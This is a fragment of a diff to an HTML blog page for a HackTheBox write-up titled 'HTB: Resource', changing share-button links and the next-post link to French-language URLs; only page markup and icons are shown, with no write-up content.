-<a class="resp-sharing-button__link" href="whatsapp://send?text=HTB%3a%20Resource%20https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-resource%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+<a class="resp-sharing-button__link" href="whatsapp://send?text=HTB%3a%20Resource%20https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-resource%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
   <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
     </div>
@@ -766,7 +767,7 @@ QBAgM=
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-resource%2f&amp;t=HTB%3a%20Resource" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-resource%2f&amp;t=HTB%3a%20Resource" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
   <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
 			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
     </div>
@@ -774,7 +775,7 @@ QBAgM=
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HTB%3a%20Resource&amp;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-resource%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HTB%3a%20Resource&amp;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-resource%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
   <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
     </div>
@@ -792,8 +793,8 @@ QBAgM=
 
             
             <span class="button next">
-                <a href="https://scorpiosec.com/posts/2024/11/htb-axlle/">
-                    <span class="button__text">HTB: Axlle</span>
+                <a href="https://scorpiosec.com/fr/posts/2024/11/htb-blazorized/">
+                    <span class="button__text">HTB: Blazorized</span>
                     <span class="button__icon">→</span>
                 </a>
             </span>
